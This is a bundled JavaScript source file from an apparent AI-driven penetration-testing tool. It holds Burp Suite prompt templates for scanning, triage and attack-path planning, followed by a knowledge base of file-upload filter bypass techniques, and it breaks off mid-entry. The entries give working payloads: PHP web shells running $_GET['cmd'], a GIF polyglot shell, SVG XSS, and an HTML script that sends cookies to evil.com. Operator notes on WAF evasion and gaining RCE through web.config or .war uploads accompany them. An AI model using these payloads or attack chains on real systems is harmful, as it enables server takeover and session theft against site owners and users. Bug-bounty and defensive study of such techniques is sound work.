    "type": "UsernameAndPasswordLogin"
  }],
  "scan_configurations": [{ "name": "Audit checks - all except time-based detection methods" }]
}

BUILT-IN SCAN CONFIGURATIONS (use exact names):
- "Audit checks - all" \u2014 Full audit including time-based (slow but thorough)
- "Audit checks - all except time-based detection methods" \u2014 Fast audit, good default
- "Audit checks - critical issues only" \u2014 Quick check for high-severity issues
- "Crawl strategy - fastest" \u2014 Minimal crawl for known endpoints
- "Crawl strategy - more complete" \u2014 Balanced crawl
- "Crawl strategy - most complete" \u2014 Maximum coverage crawl
- "Never stop audit due to application errors" \u2014 Resilient scanning
- "Minimize false positives" \u2014 Conservative detection`,
        userPromptTemplate: `Configure a Burp scan for this target:
Target: {{targetUrl}}
Technology: {{technology}}
Auth: {{authCredentials}}
Scope: {{scopeRules}}
Previous ZAP findings: {{zapFindings}}
Engagement phase: {{phase}}

Return a JSON scan request body optimized for this target. Consider:
1. Which scan configuration names to use
2. Scope include/exclude rules
3. Application login configuration
4. Whether to use crawl_and_audit or audit_only based on phase`,
        expectedOutput: "JSON scan request body for Burp REST API POST /v0.1/scan"
      },
      {
        id: "burp-finding-triage",
        phase: "triage",
        name: "Burp Finding Triage and Correlation",
        systemPrompt: `You are an expert bug bounty hunter triaging Burp Suite findings. Your role is to:
1. Classify each finding as True Positive (TP), False Positive (FP), or Needs Verification
2. Cross-reference with ZAP findings for corroboration
3. Assess exploitability and impact for bug bounty reporting
4. Prioritize findings by bounty potential

TRIAGE DECISION MATRIX:
- Burp "Certain" confidence + ZAP confirms = Definite TP \u2192 Report immediately
- Burp "Certain" confidence + ZAP no finding = Likely TP \u2192 Verify manually
- Burp "Firm" confidence + ZAP confirms = Strong TP \u2192 Report with evidence
- Burp "Firm" confidence + ZAP no finding = Needs verification \u2192 Manual test
- Burp "Tentative" confidence + ZAP confirms = Possible TP \u2192 Verify carefully
- Burp "Tentative" confidence + ZAP no finding = Likely FP \u2192 Low priority verify

CROSS-TOOL CORRELATION RULES:
- If both Burp and ZAP find the same issue \u2192 HIGH confidence, merge evidence
- If only Burp finds it (especially OOB/Collaborator) \u2192 MEDIUM confidence, Burp advantage
- If only ZAP finds it \u2192 Check if Burp was configured to test that vector
- Conflicting results \u2192 Manual verification required

BOUNTY IMPACT ASSESSMENT:
- P1 (Critical): RCE, auth bypass, full account takeover, SSRF to internal services
- P2 (High): Stored XSS, SQL injection, significant data exposure, privilege escalation
- P3 (Medium): Reflected XSS, CSRF on sensitive actions, IDOR with limited impact
- P4 (Low): Information disclosure, missing headers, minor misconfigurations`,
        userPromptTemplate: `Triage these Burp findings against ZAP results:

Burp Findings:
{{burpFindings}}

ZAP Findings (same target):
{{zapFindings}}

Target: {{targetUrl}}
Technology: {{technology}}

For each finding, provide:
1. Classification (TP/FP/Needs Verification)
2. Cross-tool correlation status
3. Bounty priority (P1-P4)
4. Recommended next steps`,
        expectedOutput: "Structured triage report with classifications and recommended actions"
      },
      {
        id: "burp-attack-path",
        phase: "exploitation",
        name: "Burp Attack Path Planner",
        systemPrompt: `You are an expert penetration tester planning attack paths using Burp Suite Professional. Your role is to chain vulnerabilities found by Burp and ZAP into exploitable attack paths.

ATTACK CHAIN METHODOLOGY:
1. Start with information disclosure findings to map internal architecture
2. Use SSRF/XXE findings to probe internal services
3. Chain authentication bypass with privilege escalation
4. Combine XSS with CSRF for account takeover
5. Use file upload + path traversal for RCE
6. Leverage Collaborator findings for OOB data exfiltration

BURP TOOLS FOR EXPLOITATION:
- Repeater: Manual request modification and replay for precise exploitation
- Intruder: Automated fuzzing for IDOR enumeration, credential stuffing
- Collaborator: OOB interaction detection for blind vulnerabilities
- Sequencer: Session token randomness analysis
- Comparer: Response comparison for timing attacks

CROSS-TOOL EXPLOITATION STRATEGY:
1. Use ZAP spider results to identify endpoints Burp didn't crawl
2. Use Burp Collaborator findings to confirm ZAP's tentative SSRF/XXE alerts
3. Use ZAP's authenticated scan results to find endpoints for Burp Intruder attacks
4. Combine ZAP's passive findings (info disclosure) with Burp's active exploitation`,
        userPromptTemplate: `Plan attack paths from these combined findings:

Burp Findings: {{burpFindings}}
ZAP Findings: {{zapFindings}}
Confirmed Credentials: {{credentials}}
Target Architecture: {{architecture}}

Generate attack chains that:
1. Start from the highest-confidence findings
2. Chain multiple vulnerabilities for maximum impact
3. Use appropriate Burp tools for each exploitation step
4. Include evidence collection steps for bug bounty reporting`,
        expectedOutput: "Ordered list of attack chains with step-by-step exploitation using Burp tools"
      }
    ];
    initBurpKnowledge().catch((e) => console.warn("[BurpKnowledge] Auto-init failed:", e.message));
  }
});

// server/lib/knowledge/file-upload-bypass-knowledge.ts
function getTechniquesForStack(stack) {
  const allTechniques = [
    ...EXTENSION_MANIPULATION_TECHNIQUES,
    ...MIME_CONFUSION_TECHNIQUES,
    ...MAGIC_BYTES_TECHNIQUES,
    ...POLYGLOT_TECHNIQUES,
    ...RACE_CONDITION_TECHNIQUES,
    ...PATH_TRAVERSAL_TECHNIQUES,
    ...WAF_EVASION_TECHNIQUES
  ];
  const successOrder = { reliable: 0, common: 1, occasional: 2, rare: 3 };
  return allTechniques.filter((t) => t.effectiveAgainst.includes(stack) || t.effectiveAgainst.includes("generic")).sort((a, b) => successOrder[a.successRate] - successOrder[b.successRate]);
}
function getBypassStrategy(stack) {
  const profile = TECH_STACK_PROFILES.find((p) => p.stack === stack);
  if (!profile) {
    return { profile: TECH_STACK_PROFILES[0], techniques: [], chains: [], postExploit: [] };
  }
  const techniques = getTechniquesForStack(stack);
  const chains = EXPLOIT_CHAINS.filter((c) => c.targetEnvironments.includes(stack));
  const postExploit = POST_UPLOAD_TECHNIQUES.filter((p) => p.targetStacks.includes(stack));
  return { profile, techniques, chains, postExploit };
}
function getTechniquesByCategory(category) {
  const allTechniques = [
    ...EXTENSION_MANIPULATION_TECHNIQUES,
    ...MIME_CONFUSION_TECHNIQUES,
    ...MAGIC_BYTES_TECHNIQUES,
    ...POLYGLOT_TECHNIQUES,
    ...RACE_CONDITION_TECHNIQUES,
    ...PATH_TRAVERSAL_TECHNIQUES,
    ...WAF_EVASION_TECHNIQUES
  ];
  return allTechniques.filter((t) => t.category === category);
}
function buildFileUploadTrainingContext() {
  const allTechniques = [
    ...EXTENSION_MANIPULATION_TECHNIQUES,
    ...MIME_CONFUSION_TECHNIQUES,
    ...MAGIC_BYTES_TECHNIQUES,
    ...POLYGLOT_TECHNIQUES,
    ...RACE_CONDITION_TECHNIQUES,
    ...PATH_TRAVERSAL_TECHNIQUES,
    ...WAF_EVASION_TECHNIQUES
  ];
  let context = `# File Upload Bypass Knowledge Base

`;
  context += `Total techniques: ${allTechniques.length}
`;
  context += `Exploit chains: ${EXPLOIT_CHAINS.length}
`;
  context += `Tech stack profiles: ${TECH_STACK_PROFILES.length}

`;
  context += `## Key Principles

`;
  context += `1. Always identify the tech stack FIRST \u2014 bypass strategies differ dramatically
`;
  context += `2. Layer multiple bypasses (extension + MIME + magic bytes) for maximum success
`;
  context += `3. Check for post-upload execution paths (direct access, LFI, SSRF, deserialization)
`;
  context += `4. Race conditions are underutilized \u2014 always test TOCTOU windows
`;
  context += `5. WAF bypass is often necessary before application-level bypass
`;
  context += `6. .htaccess and web.config uploads are often more valuable than direct shell upload

`;
  context += `## Quick Reference by Stack

`;
  for (const profile of TECH_STACK_PROFILES) {
    context += `### ${profile.name}
`;
    context += `Top bypasses: ${profile.recommendedBypassOrder.slice(0, 3).join(", ")}
`;
    context += `Weaknesses: ${profile.weaknesses.slice(0, 2).join("; ")}

`;
  }
  return context;
}
var EXTENSION_MANIPULATION_TECHNIQUES, MIME_CONFUSION_TECHNIQUES, MAGIC_BYTES_TECHNIQUES, POLYGLOT_TECHNIQUES, RACE_CONDITION_TECHNIQUES, PATH_TRAVERSAL_TECHNIQUES, EXPLOIT_CHAINS, TECH_STACK_PROFILES, WAF_EVASION_TECHNIQUES, POST_UPLOAD_TECHNIQUES;
var init_file_upload_bypass_knowledge = __esm({
  "server/lib/knowledge/file-upload-bypass-knowledge.ts"() {
    "use strict";
    EXTENSION_MANIPULATION_TECHNIQUES = [
      // Case manipulation
      {
        id: "ext-case-upper",
        name: "Uppercase Extension",
        category: "extension_manipulation",
        subcategory: "case_variation",
        payload: "shell.PHP, shell.Php, shell.pHp, shell.phP",
        mechanism: "Many blacklist filters use case-sensitive string matching. Linux filesystems are case-sensitive, so .PHP and .php are different extensions, but Apache/PHP may still execute both.",
        useWhen: ["Blacklist-based validation detected", "Linux server with Apache", "Case-sensitive filename check in application code"],
        effectiveAgainst: ["php_apache", "php_nginx"],
        detectionRisk: "low",
        mitreTechniques: ["T1036.008"],
        chainsTo: ["ext-double-extension", "mime-image-php"],
        detectionSignatures: ["Unusual extension casing in upload logs", "Mixed-case PHP extensions in web root"],
        successRate: "occasional",
        operatorNotes: "Try all case permutations: .pHp, .PhP, .PHP, .pHP, .Php, .phP. On Windows/IIS this is less effective since NTFS is case-insensitive."
      },
      {
        id: "ext-double-extension",
        name: "Double Extension",
        category: "extension_manipulation",
        subcategory: "double_extension",
        payload: "shell.php.jpg, shell.php.png, shell.php.gif, shell.asp.jpg, shell.jsp.png",
        mechanism: "Some validators only check the last extension. Apache with mod_php may execute based on the first recognized extension. If AddHandler is configured for .php, Apache processes shell.php.jpg as PHP.",
        useWhen: ["Validator checks only last extension", "Apache with AddHandler directive", "Nginx with misconfigured location blocks"],
        effectiveAgainst: ["php_apache", "php_nginx", "aspnet_iis"],
        detectionRisk: "medium",
        mitreTechniques: ["T1036.008", "T1059.004"],
        chainsTo: ["magic-bytes-gif", "mime-image-jpeg"],
        detectionSignatures: ["Multiple extensions in filename", "Executable extension before image extension"],
        successRate: "common",
        operatorNotes: "Key insight: Apache processes extensions right-to-left until it finds one it recognizes. So shell.php.xyz will execute as PHP if .xyz is unknown. Check httpd.conf for AddHandler/AddType directives."
      },
      {
        id: "ext-reverse-double",
        name: "Reverse Double Extension",
        category: "extension_manipulation",
        subcategory: "double_extension",
        payload: "shell.jpg.php, shell.png.php, shell.gif.php, shell.pdf.asp",
        mechanism: "If the validator checks only the first extension (less common but exists in custom code), placing the executable extension last bypasses the check while the server executes it.",
        useWhen: ["Custom validation that checks first extension", "Server executes based on last extension"],
        effectiveAgainst: ["php_apache", "node_express", "python_django"],
        detectionRisk: "medium",
        mitreTechniques: ["T1036.008"],
        chainsTo: ["content-type-image"],
        detectionSignatures: ["Executable extension as final extension after image extension"],
        successRate: "occasional",
        operatorNotes: "Less common to succeed than forward double extension, but worth trying when forward fails."
      },
      // Null byte injection
      {
        id: "ext-null-byte",
        name: "Null Byte Injection",
        category: "null_byte",
        subcategory: "null_termination",
        payload: "shell.php%00.jpg, shell.asp%00.png, shell.php\\x00.gif",
        mechanism: "In languages with C-string handling (older PHP < 5.3.4, older Java), the null byte terminates the string. The validator sees .jpg but the filesystem writes shell.php (truncated at null).",
        useWhen: ["PHP < 5.3.4 detected", "Older Java versions", "C-based file handling libraries", "URL-decoded filenames"],
        effectiveAgainst: ["php_apache", "php_nginx", "java_tomcat"],
        detectionRisk: "high",
        mitreTechniques: ["T1036.008", "T1027"],
        chainsTo: ["ext-double-extension", "path-traversal-basic"],
        detectionSignatures: ["%00 or \\x00 in filename", "Null bytes in HTTP multipart data", "Filename length mismatch between validation and storage"],
        successRate: "rare",
        operatorNotes: "Mostly patched in modern stacks but still found in legacy applications, embedded systems, and IoT devices. Always try URL-encoded (%00) and raw null byte variants."
      },
      // Special character injection
      {
        id: "ext-newline",
        name: "Newline Character in Extension",
        category: "special_characters",
        subcategory: "newline_injection",
        payload: "shell.php%0a.jpg, shell.php%0d.jpg, shell.php%0d%0a.jpg, shell.php\\n.jpg",
        mechanism: "Newline characters (LF %0a, CR %0d, CRLF %0d%0a) can confuse validators that process filenames line-by-line or use regex without DOTALL flag. Some filesystems silently strip or replace these characters.",
        useWhen: ["Regex-based validation without multiline handling", "Filename processed through shell commands", "Log injection possible"],
        effectiveAgainst: ["php_apache", "php_nginx", "node_express", "python_flask"],
        detectionRisk: "medium",
        mitreTechniques: ["T1036.008", "T1027"],
        chainsTo: ["ext-null-byte", "path-traversal-encoded"],
        detectionSignatures: ["URL-encoded newlines in filename", "Multiline filename in logs"],
        successRate: "occasional",
        operatorNotes: "Try all variants: %0a (LF), %0d (CR), %0d%0a (CRLF). On Linux, LF is most effective. On Windows, CRLF. Some frameworks silently strip these \u2014 check if the stored filename differs from the uploaded one."
      },
      {
        id: "ext-tab-char",
        name: "Tab Character in Extension",
        category: "special_characters",
        subcategory: "whitespace_injection",
        payload: "shell.php%09.jpg, shell%09.php.jpg, shell.ph%09p",
        mechanism: "Tab characters (%09) can break regex patterns that don't account for whitespace within extensions. Some parsers treat tabs as delimiters, splitting the filename unexpectedly.",
        useWhen: ["Regex validation without \\s handling", "Filename parsed by shell commands", "Custom extension extraction logic"],
        effectiveAgainst: ["php_apache", "node_express", "python_flask"],
        detectionRisk: "medium",
        mitreTechniques: ["T1036.008"],
        chainsTo: ["ext-newline", "ext-space"],
        detectionSignatures: ["Tab characters in uploaded filenames", "Whitespace in file extensions"],
        successRate: "rare",
        operatorNotes: "Less commonly effective than newline but worth trying in combination. Some WAFs don't inspect tab characters in filenames."
      },
      {
        id: "ext-space",
        name: "Trailing Space in Extension",
        category: "special_characters",
        subcategory: "whitespace_injection",
        payload: "shell.php .jpg, shell.php%20, shell.php , shell.php%20%20%20",
        mechanism: "Windows NTFS silently strips trailing spaces from filenames. Upload 'shell.php ' \u2192 stored as 'shell.php'. Linux preserves spaces but some frameworks trim them during processing.",
        useWhen: ["Windows/IIS target", "Framework that trims filenames", "Validator doesn't trim before checking"],
        effectiveAgainst: ["aspnet_iis", "php_apache", "java_tomcat"],
        detectionRisk: "low",
        mitreTechniques: ["T1036.008"],
        chainsTo: ["ext-dot-trailing", "mime-image-php"],
        detectionSignatures: ["Trailing spaces in filename", "Filename length discrepancy"],
        successRate: "occasional",
        operatorNotes: "On Windows, trailing spaces AND dots are stripped. So 'shell.php...' becomes 'shell.php'. Very reliable on IIS."
      },
      {
        id: "ext-dot-trailing",
        name: "Trailing Dot in Extension",
        category: "special_characters",
        subcategory: "dot_manipulation",
        payload: "shell.php., shell.php.., shell.php..., shell.php....jpg",
        mechanism: "Windows NTFS strips trailing dots from filenames. Upload 'shell.php.' \u2192 stored as 'shell.php'. Validator sees the trailing dot and may not recognize .php as the extension.",
        useWhen: ["Windows/IIS target", "Validator checks for exact extension match", "Blacklist doesn't include dotted variants"],
        effectiveAgainst: ["aspnet_iis", "java_tomcat"],
        detectionRisk: "low",
        mitreTechniques: ["T1036.008"],
        chainsTo: ["ext-space", "ext-semicolon"],
        detectionSignatures: ["Trailing dots in filename", "Multiple consecutive dots"],
        successRate: "common",
        operatorNotes: "Extremely reliable on Windows. NTFS will strip ALL trailing dots and spaces. Combine with spaces: 'shell.php. . .' all becomes 'shell.php'."
      },
      {
        id: "ext-semicolon",
        name: "Semicolon in Filename (IIS)",
        category: "special_characters",
        subcategory: "delimiter_injection",
        payload: "shell.asp;.jpg, shell.asp;filename.jpg, shell.aspx;.png",
        mechanism: "IIS 6.0 and some versions of IIS 7.x treat semicolons as parameter delimiters in URLs. The file 'shell.asp;.jpg' is served as ASP because IIS sees 'shell.asp' with parameter '.jpg'.",
        useWhen: ["IIS 6.0 or misconfigured IIS 7.x", "ASP/ASPX application", "URL-based file serving"],
        effectiveAgainst: ["aspnet_iis"],
        detectionRisk: "medium",
        mitreTechniques: ["T1036.008", "T1059.001"],
        chainsTo: ["ext-colon-ads", "path-traversal-iis"],
        detectionSignatures: ["Semicolons in uploaded filenames", "IIS request for file with semicolons"],
        successRate: "common",
        operatorNotes: "Classic IIS bypass. Even on newer IIS versions, check if the application layer processes semicolons differently from the web server."
      },
      {
        id: "ext-colon-ads",
        name: "NTFS Alternate Data Stream (ADS)",
        category: "special_characters",
        subcategory: "ntfs_specific",
        payload: "shell.asp::$DATA, shell.php::$DATA, shell.aspx:.jpg",
        mechanism: "NTFS Alternate Data Streams allow multiple data streams per file. Appending ::$DATA accesses the default stream. Some validators don't recognize this as executable, but IIS/Windows will execute the base file.",
        useWhen: ["Windows/IIS target", "NTFS filesystem", "Validator doesn't handle ADS syntax"],
        effectiveAgainst: ["aspnet_iis"],
        detectionRisk: "high",
        mitreTechniques: ["T1036.008", "T1564.004"],
        chainsTo: ["ext-semicolon", "ext-dot-trailing"],
        detectionSignatures: ["::$DATA in filename", "Colon characters in uploaded filenames", "ADS access in file system logs"],
        successRate: "occasional",
        operatorNotes: "Only works on NTFS. The ::$DATA suffix accesses the default data stream, effectively stripping the suffix. Some WAFs specifically block this pattern."
      },
      {
        id: "ext-hash",
        name: "Hash Character Truncation",
        category: "special_characters",
        subcategory: "url_fragment",
        payload: "shell.php#.jpg, shell.php%23.jpg",
        mechanism: "In URL contexts, # denotes a fragment identifier. If the filename is processed as a URL, everything after # is ignored. The server may store/serve 'shell.php' while the validator saw 'shell.php#.jpg'.",
        useWhen: ["Filename processed as URL", "Client-side validation only", "Framework uses URL parsing for filenames"],
        effectiveAgainst: ["node_express", "python_flask", "generic"],
        detectionRisk: "low",
        mitreTechniques: ["T1036.008"],
        chainsTo: ["ext-question-mark", "encoding-double-url"],
        detectionSignatures: ["Hash character in uploaded filename", "Fragment identifier in file path"],
        successRate: "rare",
        operatorNotes: "More effective in client-side validation bypass. Server-side, it depends on whether the framework URL-decodes the filename before or after validation."
      },
      {
        id: "ext-question-mark",
        name: "Question Mark Query String",
        category: "special_characters",
        subcategory: "url_query",
        payload: "shell.php?.jpg, shell.php%3f.jpg",
        mechanism: "Similar to hash \u2014 if filename is treated as URL, ? starts a query string. Everything after is ignored for path resolution. Server stores 'shell.php' while validator sees full string.",
        useWhen: ["URL-based file serving", "Filename used in redirect/include", "Query string not stripped before storage"],
        effectiveAgainst: ["php_apache", "node_express", "generic"],
        detectionRisk: "low",
        mitreTechniques: ["T1036.008"],
        chainsTo: ["ext-hash", "path-traversal-encoded"],
        detectionSignatures: ["Question mark in uploaded filename"],
        successRate: "rare",
        operatorNotes: "Works best when the upload path is later used in an include() or require() that processes it as a URL."
      },
      // Unicode/encoding bypasses
      {
        id: "ext-unicode-rtlo",
        name: "Right-to-Left Override (RTLO)",
        category: "encoding_bypass",
        subcategory: "unicode_bidi",
        payload: "shell\\u202Ephp.jpg \u2192 displays as 'shelljpg.php' visually but stored as 'shell[RTLO]php.jpg'",
        mechanism: "Unicode RTLO character (U+202E) reverses text rendering direction. The filename appears as an image to humans/validators but the actual bytes contain .php. Some systems execute based on actual bytes, not display.",
        useWhen: ["Human review of uploaded files", "Validator uses rendered filename", "Email attachment filtering"],
        effectiveAgainst: ["generic", "aspnet_iis"],
        detectionRisk: "high",
        mitreTechniques: ["T1036.002", "T1027"],
        chainsTo: ["magic-bytes-gif", "mime-image-jpeg"],
        detectionSignatures: ["Unicode bidirectional control characters in filename", "U+202E in file metadata"],
        successRate: "occasional",
        operatorNotes: "Primarily effective against human reviewers and basic string-display validators. Modern upload handlers often strip bidi control characters. Still effective in email-based attacks."
      },
      {
        id: "ext-unicode-homoglyph",
        name: "Unicode Homoglyph Extension",
        category: "encoding_bypass",
        subcategory: "homoglyph",
        payload: "shell.\u03C1h\u03C1 (Greek rho), shell.\u0440h\u0440 (Cyrillic), shell.\u217Ehp (Roman numeral)",
        mechanism: "Replace ASCII characters in the extension with visually identical Unicode characters. Blacklist checks for '.php' won't match '.\u03C1h\u03C1' (Greek rho looks like 'p'). If the server normalizes Unicode before execution, it may still execute.",
        useWhen: ["Blacklist-based extension filtering", "No Unicode normalization", "Visual inspection by humans"],
        effectiveAgainst: ["generic", "php_apache", "node_express"],
        detectionRisk: "medium",
        mitreTechniques: ["T1036.002", "T1027"],
        chainsTo: ["ext-unicode-rtlo", "encoding-double-url"],
        detectionSignatures: ["Non-ASCII characters in file extension", "Unicode normalization mismatch"],
        successRate: "rare",
        operatorNotes: "Effectiveness depends entirely on whether the server normalizes Unicode before extension checking AND before execution. Most modern frameworks handle this, but custom code often doesn't."
      },
      {
        id: "encoding-double-url",
        name: "Double URL Encoding",
        category: "encoding_bypass",
        subcategory: "double_encoding",
        payload: "shell%252ephp (. = %2e \u2192 %252e), shell.ph%2570 (p = %70 \u2192 %2570)",
        mechanism: "If the application URL-decodes the filename twice (once at the web server, once in application code), double-encoded characters bypass first-pass validation but resolve to the malicious extension on second decode.",
        useWhen: ["Application performs double URL decoding", "WAF decodes once, app decodes again", "Proxy chain with multiple decode steps"],
        effectiveAgainst: ["php_apache", "java_tomcat", "aspnet_iis", "generic"],
        detectionRisk: "medium",
        mitreTechniques: ["T1027", "T1036.008"],
        chainsTo: ["ext-null-byte", "path-traversal-encoded"],
        detectionSignatures: ["Double-encoded characters in filename", "%25 sequences in upload data"],
        successRate: "occasional",
        operatorNotes: "Test systematically: encode the dot (%252e), the extension letters (%2570%2568%2570 for php), or both. Check if the application has multiple decode steps."
      },
      {
        id: "ext-overlong-utf8",
        name: "Overlong UTF-8 Encoding",
        category: "encoding_bypass",
        subcategory: "utf8_overlong",
        payload: "shell.ph\\xc0\\xf0 (overlong 'p'), shell\\xc0\\xae\\xc0\\xae/etc/passwd (overlong '../')",
        mechanism: "UTF-8 allows multiple byte sequences to represent the same character (overlong encoding). Validators may not recognize overlong sequences as the target character, but some parsers normalize them before use.",
        useWhen: ["Older systems without UTF-8 validation", "Custom byte-level parsing", "IDS/WAF bypass"],
        effectiveAgainst: ["java_tomcat", "generic"],
        detectionRisk: "high",
        mitreTechniques: ["T1027", "T1036.008"],
        chainsTo: ["path-traversal-encoded", "encoding-double-url"],
        detectionSignatures: ["Overlong UTF-8 sequences in filename", "Invalid UTF-8 in upload data"],
        successRate: "rare",
        operatorNotes: "Mostly patched in modern systems. Still found in embedded devices, legacy Java applications, and custom C/C++ file handlers. RFC 3629 explicitly forbids overlong sequences."
      },
      // PHP-specific extensions
      {
        id: "ext-php-alternatives",
        name: "PHP Alternative Extensions",
        category: "server_specific",
        subcategory: "php_extensions",
        payload: ".php3, .php4, .php5, .php7, .pht, .phtml, .phar, .phps, .pgif, .shtml, .inc",
        mechanism: "Apache may be configured to execute multiple extensions as PHP via AddHandler/AddType directives. .phtml, .pht, .php5 are commonly enabled. .phar is PHP archive format that executes. .phps shows source but confirms PHP processing.",
        useWhen: ["PHP/Apache target", ".php is blacklisted", "AddHandler directive present in httpd.conf", "PHP-FPM with broad regex"],
        effectiveAgainst: ["php_apache", "php_nginx"],
        detectionRisk: "medium",
        mitreTechniques: ["T1059.004", "T1036.008"],
        chainsTo: ["ext-double-extension", "magic-bytes-gif"],
        detectionSignatures: ["Uncommon PHP extensions in uploads", "phtml/pht/phar files in web root"],
        successRate: "common",
        operatorNotes: "ALWAYS try .phtml and .pht first \u2014 they're the most commonly overlooked. Check /etc/apache2/mods-enabled/php*.conf for which extensions are registered. .phar is especially dangerous as it's a full archive format."
      },
      // ASP.NET specific
      {
        id: "ext-aspnet-alternatives",
        name: "ASP.NET Alternative Extensions",
        category: "server_specific",
        subcategory: "aspnet_extensions",
        payload: ".asp, .aspx, .asa, .asax, .ascx, .ashx, .asmx, .cer, .soap, .rem, .config, .cshtml",
        mechanism: "IIS maps multiple extensions to the ASP.NET ISAPI handler. .ashx (HTTP handlers), .asmx (web services), .config (web.config overwrite) can all achieve code execution. .cer is treated as ASP on some IIS configurations.",
        useWhen: ["IIS/ASP.NET target", ".aspx is blacklisted", "Handler mappings not restricted", "web.config upload possible"],
        effectiveAgainst: ["aspnet_iis"],
        detectionRisk: "medium",
        mitreTechniques: ["T1059.001", "T1036.008"],
        chainsTo: ["ext-semicolon", "ext-colon-ads"],
        detectionSignatures: ["Uncommon ASP.NET extensions in uploads", "web.config in upload directory"],
        successRate: "common",
        operatorNotes: "web.config upload is the holy grail \u2014 it can reconfigure the entire application. If you can upload to the app root, try uploading a web.config that adds a new handler mapping for your shell extension."
      },
      // Java specific
      {
        id: "ext-java-alternatives",
        name: "Java/Tomcat Alternative Extensions",
        category: "server_specific",
        subcategory: "java_extensions",
        payload: ".jsp, .jspx, .jsw, .jsv, .jspf, .war, .jar, .class, .xml (web.xml)",
        mechanism: "Tomcat processes multiple JSP-related extensions. .jspx is JSP in XML format. .jspf is JSP fragment (included). .war deployment can overwrite entire applications. web.xml modification can add new servlet mappings.",
        useWhen: ["Tomcat/Java target", ".jsp is blacklisted", "WAR deployment endpoint accessible", "Upload to WEB-INF possible"],
        effectiveAgainst: ["java_tomcat", "java_spring"],
        detectionRisk: "high",
        mitreTechniques: ["T1059", "T1036.008"],
        chainsTo: ["ext-double-extension", "path-traversal-basic"],
        detectionSignatures: ["JSP variant extensions in uploads", "WAR/JAR files uploaded", "web.xml modifications"],
        successRate: "occasional",
        operatorNotes: "If you can upload a .war file to the Tomcat manager or auto-deploy directory, that's instant RCE. Check for /manager/html endpoint. .jspf files are executed when included by another JSP."
      }
    ];
    MIME_CONFUSION_TECHNIQUES = [
      {
        id: "mime-image-php",
        name: "Image Content-Type with PHP Body",
        category: "content_type_spoofing",
        subcategory: "mime_mismatch",
        payload: "Content-Type: image/jpeg\\n\\n<?php system($_GET['cmd']); ?>",
        mechanism: "Set Content-Type header to image/jpeg while the body contains PHP code. If the server validates only the Content-Type header (not file content/magic bytes), the PHP file is accepted and later executed.",
        useWhen: ["Server validates Content-Type header only", "No magic byte verification", "File extension determines execution"],
        effectiveAgainst: ["php_apache", "php_nginx", "node_express", "python_django"],
        detectionRisk: "medium",
        mitreTechniques: ["T1036.008", "T1059.004"],
        chainsTo: ["magic-bytes-gif", "ext-double-extension"],
        detectionSignatures: ["Content-Type mismatch with file content", "PHP tags in image upload"],
        successRate: "common",
        operatorNotes: "Always pair with magic bytes for maximum effectiveness. Many modern frameworks check both Content-Type AND magic bytes, so you need both to match the claimed type."
      },
      {
        id: "mime-octet-stream",
        name: "application/octet-stream Bypass",
        category: "content_type_spoofing",
        subcategory: "generic_mime",
        payload: "Content-Type: application/octet-stream",
        mechanism: "application/octet-stream is the generic binary type. Some validators whitelist specific types and reject unknown ones, but others allow octet-stream as a fallback. The server then determines handling by extension.",
        useWhen: ["Whitelist allows generic binary", "Server falls back to extension-based handling", "Custom upload handler"],
        effectiveAgainst: ["generic", "node_express", "python_flask"],
        detectionRisk: "low",
        mitreTechniques: ["T1036.008"],
        chainsTo: ["ext-php-alternatives", "ext-double-extension"],
        detectionSignatures: ["application/octet-stream for non-binary uploads"],
        successRate: "occasional",
        operatorNotes: "Try this when specific MIME types are rejected. It's the 'I don't know what this is' type, and many servers just accept it."
      },
      {
        id: "mime-svg-xss",
        name: "SVG with Embedded JavaScript",
        category: "content_type_spoofing",
        subcategory: "svg_injection",
        payload: "Content-Type: image/svg+xml\\n\\n<svg xmlns='http://www.w3.org/2000/svg'><script>alert(document.cookie)</script></svg>",
        mechanism: "SVG files are valid XML that can contain <script> tags. If uploaded SVGs are served with image/svg+xml Content-Type, browsers will execute the embedded JavaScript. This achieves stored XSS.",
        useWhen: ["SVG uploads allowed", "Files served from same origin", "No CSP or weak CSP", "Image upload feature"],
        effectiveAgainst: ["generic", "node_express", "python_django", "ruby_rails"],
        detectionRisk: "medium",
        mitreTechniques: ["T1059.007", "T1189"],
        chainsTo: ["mime-html-upload", "metadata-exif-xss"],
        detectionSignatures: ["Script tags in SVG files", "Event handlers in SVG attributes", "JavaScript in uploaded images"],
        successRate: "common",
        operatorNotes: "Even if direct script tags are filtered, try: onload/onerror attributes, foreignObject with HTML, use/xlink:href to external resources, CSS @import. SVG is incredibly versatile for XSS."
      },
      {
        id: "mime-html-upload",
        name: "HTML File Upload for XSS/Phishing",
        category: "content_type_spoofing",
        subcategory: "html_injection",
        payload: "Content-Type: text/html\\n\\n<html><body><script>fetch('https://evil.com/steal?c='+document.cookie)</script></body></html>",
        mechanism: "If HTML files can be uploaded and served from the application's domain, they execute in the application's origin context, giving access to cookies, localStorage, and same-origin APIs.",
        useWhen: ["HTML/HTM uploads not blocked", "Files served from same origin", "No Content-Disposition: attachment header"],
        effectiveAgainst: ["generic", "aws_s3", "azure_blob"],
        detectionRisk: "medium",
        mitreTechniques: ["T1059.007", "T1189", "T1566.002"],
        chainsTo: ["mime-svg-xss", "path-traversal-basic"],
        detectionSignatures: ["HTML files in upload directory", "Script tags in uploaded files"],
        successRate: "common",
        operatorNotes: "Check if uploaded files are served with Content-Disposition: attachment (forces download) vs inline (renders in browser). If inline, you have stored XSS. Also try .htm, .xhtml, .shtml variants."
      }
    ];
    MAGIC_BYTES_TECHNIQUES = [
      {
        id: "magic-bytes-gif",
        name: "GIF89a Magic Bytes + PHP",
        category: "magic_bytes",
        subcategory: "image_polyglot",
        payload: "GIF89a;\\n<?php system($_GET['cmd']); ?>",
        mechanism: "Prepend GIF89a (the GIF file signature) to PHP code. Magic byte validators see a valid GIF header. PHP ignores the GIF header as non-PHP text and executes the <?php block. File is simultaneously valid GIF (technically) and PHP.",
        useWhen: ["Server checks magic bytes/file signature", "getimagesize() validation in PHP", "file command used for validation"],
        effectiveAgainst: ["php_apache", "php_nginx"],
        detectionRisk: "medium",
        mitreTechniques: ["T1036.008", "T1027.001"],
        chainsTo: ["ext-double-extension", "mime-image-php"],
        detectionSignatures: ["GIF header followed by PHP tags", "Polyglot file detection", "Image with embedded code"],
        successRate: "reliable",
        operatorNotes: "GIF89a is the easiest polyglot \u2014 just 6 bytes prefix. For more robust bypass, create a valid GIF with PHP in a comment block. getimagesize() will return valid dimensions."
      },
      {
        id: "magic-bytes-png",
        name: "PNG Magic Bytes + PHP in Metadata",
        category: "magic_bytes",
        subcategory: "image_polyglot",
